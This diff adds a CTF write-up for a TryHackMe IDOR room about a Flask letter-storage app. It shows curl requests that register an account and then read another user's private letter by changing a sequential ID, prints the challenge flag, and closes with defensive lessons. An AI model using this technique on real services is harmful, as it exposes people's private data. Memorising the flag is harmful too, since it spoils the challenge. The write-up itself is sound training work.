@@ -1,0 +1,67 @@
+# Room Name - TryHackMe: Love Letter Locker
+Date: 02 August 2026
+Difficulty: Easy
+Category: IDOR / Broken Access Control
+
+# Scenario
+Welcome to LoveLetterLocker, where you can safely write and store your Valentine's letters. For your eyes only? The challenge involved identifying a sequential integer ID pattern in a letter storage application and exploiting an IDOR vulnerability to access other users' private letters without any authorisation check.
+
+# Tools Used
+- TryHackMe Attack Box
+- Terminal (bash)
+- curl
+- nmap
+
+# What I Did
+
+Step 1 — Reconnaissance
+- Ran nmap and confirmed only two open ports: 22 (SSH) and 5000 (Flask web app).
+- Registered an account and explored the application routes: /register, /login, /letters (list), /letters/new (create), and /letter/<id> (view individual letter).
+
+Step 2 — Identify the ID pattern
+- Noted an explicit hint on the /letters page: "Every love letter gets a unique number in the archive. Numbers make everything easier to find."
+- This directly indicated sequential, guessable numeric IDs were used as the access mechanism for individual letters.
+
+Step 3 — Register, log in, and create a letter to observe the ID assignment
+- Registered a new account:
+```
+curl -c cookies_lll.txt -X POST http://10.49.176.238:5000/register \
+  -d "username=attacker1&password=password123"
+```
+- Logged in and captured the session cookie:
+```
+curl -b cookies_lll.txt -c cookies_lll.txt -X POST http://10.49.176.238:5000/login \
+  -d "username=attacker1&password=password123"
+```
+- Created a new letter to observe the ID assigned:
+```
+curl -b cookies_lll.txt -X POST http://10.49.176.238:5000/letters/new \
+  -d "title=Test&body=Test message"
+```
+- Checked the /letters page and confirmed the new letter was assigned ID 3, meaning IDs 1 and 2 belonged to other users.
+
+Step 4 — Exploit the IDOR
+- Requested letter ID 1 directly using the authenticated session cookie:
+```
+curl -b cookies_lll.txt http://10.49.176.238:5000/letter/1
+```
+- The server returned another user's private letter with no authorisation check, confirming the IDOR vulnerability.
+- Found the flag embedded inside Letter 1, authored by Gonz0.
+
+# What I Found
+- Vulnerable endpoint: /letter/<id> (no ownership check against authenticated session)
+- ID pattern: sequential integers starting from 1
+- Own letter assigned: ID 3
+- Other users' letters accessible: IDs 1 and 2
+- Flag found in: Letter 1 (author: Gonz0)
+- Flag: THM{1_c4n_r3ad_4ll_l3tters_w1th_th1s_1d0r}
+
+# Key Learning
+This is a textbook IDOR vulnerability where the server trusted a numeric ID from the URL path without verifying it belonged to the authenticated user's account. The application hint about sequential numbering made the attack surface explicit, but in real environments sequential IDs are equally discoverable through normal account usage. IDOR vulnerabilities are consistently one of the most common findings in web application assessments because they are easy to introduce during development and invisible to users who do not know to look for them. The fix requires a server-side ownership check on every letter retrieval: confirm that the requested letter ID's owner field matches the session's authenticated user before returning any data.
+
+# What I Would Flag in a Real SOC
+- Any resource retrieval endpoint using a sequential numeric ID without an ownership check is an IDOR vulnerability, all object access must be authorised against the authenticated session at the server side on every request regardless of how the ID was obtained
+- An application that explicitly tells users that records are numbered sequentially is inadvertently advertising its own IDOR attack surface, resource identifiers should be non-guessable UUIDs rather than sequential integers for any private or sensitive content
+- Unauthenticated or cross-session access to private user content such as personal letters, messages, or documents represents a data protection violation under GDPR and similar regulations, any confirmed IDOR on personal data should be treated as a reportable data breach
+- Automated IDOR scanning by iterating numeric IDs from an authenticated session would be detectable in access logs as a single session requesting a large volume of records belonging to different users, anomalous access patterns across user-owned resources should trigger alerts
+- The absence of any 403 response when accessing another user's resource confirms the server has no authorisation layer at all on that endpoint, not merely a weak one, this is a design-level failure requiring a dedicated fix rather than a configuration change
